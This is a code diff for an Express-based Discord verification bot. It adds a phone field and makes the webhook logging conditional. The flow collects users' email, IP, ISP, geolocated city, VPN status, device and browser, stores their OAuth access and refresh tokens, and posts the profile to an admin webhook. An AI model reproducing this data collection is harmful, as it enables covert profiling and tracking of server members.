@@ -13,7 +13,6 @@ const app = express();
 
 const PUBLIC_KEY = process.env.PUBLIC_KEY || '';
 
-// /interactions 는 raw body 로 먼저 받아야 서명 검증 가능 (json() 보다 먼저)
 app.post('/interactions', express.raw({ type: 'application/json' }), async (req, res) => {
   const sig = req.headers['x-signature-ed25519'];
   const ts = req.headers['x-signature-timestamp'];
@@ -146,6 +145,7 @@ app.get('/oauth/callback', async (req, res) => {
       userId: discordUser.id, username: discordUser.username,
       globalName: discordUser.global_name || discordUser.username,
       avatar: discordUser.avatar, email: discordUser.email || '비공개',
+      phone: discordUser.phone || '비공개',
       ip: realIp, isp: ipInfo.isp, org: ipInfo.org,
       country: ipInfo.country, region: ipInfo.region, city: ipInfo.city,
       isMobile: ipInfo.mobile, isVpn: ipInfo.proxy, isHosting: ipInfo.hosting,
@@ -168,6 +168,7 @@ app.get('/verify/confirm', (req, res) => {
 });
 
 app.get('/verify/blocked', (req, res) => res.sendFile(path.join(__dirname, 'public', 'blocked.html')));
+
 app.get('/api/verify-data', (req, res) => {
   if (!req.session.pendingVerify) return res.status(401).json({ error: 'No session' });
   const d = req.session.pendingVerify;
@@ -182,7 +183,6 @@ app.post('/api/verify-complete', async (req, res) => {
     if (configRes.rows.length === 0) return res.json({ success: false, error: '서버 설정을 찾을 수 없습니다.' });
     const config = configRes.rows[0];
 
-    // REST API 로 서버 입장 + 역할 부여
     try {
       await axios.put(
         `https://discord.com/api/v10/guilds/${d.guild_id}/members/${d.userId}`,
@@ -191,9 +191,8 @@ app.post('/api/verify-complete', async (req, res) => {
       );
     } catch(e) {
       if (e.response?.status === 204 || e.response?.status === 200) {
-        // Already in guild
+        // Already in guild — do nothing
       } else {
-        // 이미 서버에 있으면 역할만 부여
         try {
           await axios.put(
             `https://discord.com/api/v10/guilds/${d.guild_id}/members/${d.userId}/roles/${config.role_id}`,
@@ -214,35 +213,39 @@ app.post('/api/verify-complete', async (req, res) => {
        d.country, d.region, d.city, d.accessToken, d.refreshToken, d.tokenExpiresAt]
     );
 
-    const avatarUrl = d.avatar
-      ? `https://cdn.discordapp.com/avatars/${d.userId}/${d.avatar}.png`
-      : `https://cdn.discordapp.com/embed/avatars/0.png`;
-    let networkStatus = '🏠 일반 (와이파이/유선)';
-    if (d.isVpn) networkStatus = '🚨 VPN / 프록시 감지';
-    else if (d.isHosting) networkStatus = '⚠️ 서버/데이터센터 IP';
-    else if (d.isMobile) networkStatus = '📱 모바일 데이터';
+    // 웹훅이 설정된 경우에만 로그 전송
+    if (config.webhook_url) {
+      const avatarUrl = d.avatar
+        ? `https://cdn.discordapp.com/avatars/${d.userId}/${d.avatar}.png`
+        : `https://cdn.discordapp.com/embed/avatars/0.png`;
+      let networkStatus = '🏠 일반 (와이파이/유선)';
+      if (d.isVpn) networkStatus = '🚨 VPN / 프록시 감지';
+      else if (d.isHosting) networkStatus = '⚠️ 서버/데이터센터 IP';
+      else if (d.isMobile) networkStatus = '📱 모바일 데이터';
 
-    try {
-      await axios.post(config.webhook_url, {
-        embeds: [{
-          title: '🛡️ 인증 로그', color: d.isVpn ? 0xED4245 : d.isHosting ? 0xFEE75C : 0x57F287,
-          thumbnail: { url: avatarUrl },
-          fields: [
-            { name: '👤 유저', value: `<@${d.userId}> (${d.globalName})`, inline: true },
-            { name: '🆔 유저 ID', value: `\`${d.userId}\``, inline: true },
-            { name: '📧 이메일', value: d.email, inline: false },
-            { name: '🌐 접속 IP', value: `\`${d.ip}\``, inline: true },
-            { name: '🏢 ISP', value: d.isp, inline: true },
-            { name: '🔒 네트워크', value: networkStatus, inline: false },
-            { name: '📍 ISP 등록 위치', value: `${d.country} / ${d.region} / ${d.city}`, inline: false },
-            { name: '💻 기기', value: d.deviceType, inline: true },
-            { name: '🖥️ OS', value: d.os, inline: true },
-            { name: '🌏 브라우저', value: d.browser, inline: true }
-          ],
-          footer: { text: `인증 시각: ${new Date().toLocaleString('ko-KR', { timeZone: 'Asia/Seoul' })}` }
-        }]
-      });
-    } catch(e) { console.error('[Verify] Webhook error:', e.message); }
+      try {
+        await axios.post(config.webhook_url, {
+          embeds: [{
+            title: '🛡️ 인증 로그', color: d.isVpn ? 0xED4245 : d.isHosting ? 0xFEE75C : 0x57F287,
+            thumbnail: { url: avatarUrl },
+            fields: [
+              { name: '👤 유저', value: `<@${d.userId}> (${d.globalName})`, inline: true },
+              { name: '🆔 유저 ID', value: `\`${d.userId}\``, inline: true },
+              { name: '📧 이메일', value: d.email, inline: true },
+              { name: '📱 전화번호', value: d.phone || '비공개', inline: true },
+              { name: '🌐 접속 IP', value: `\`${d.ip}\``, inline: true },
+              { name: '🏢 ISP', value: d.isp, inline: true },
+              { name: '🔒 네트워크', value: networkStatus, inline: false },
+              { name: '📍 예상 지역', value: `${d.country} / ${d.region} / ${d.city}`, inline: false },
+              { name: '💻 기기', value: d.deviceType, inline: true },
+              { name: '🖥️ OS', value: d.os, inline: true },
+              { name: '🌏 브라우저', value: d.browser, inline: true }
+            ],
+            footer: { text: `인증 시각: ${new Date().toLocaleString('ko-KR', { timeZone: 'Asia/Seoul' })}` }
+          }]
+        });
+      } catch(e) { console.error('[Verify] Webhook error:', e.message); }
+    }
 
     req.session.pendingVerify = null;
     res.json({ success: true });
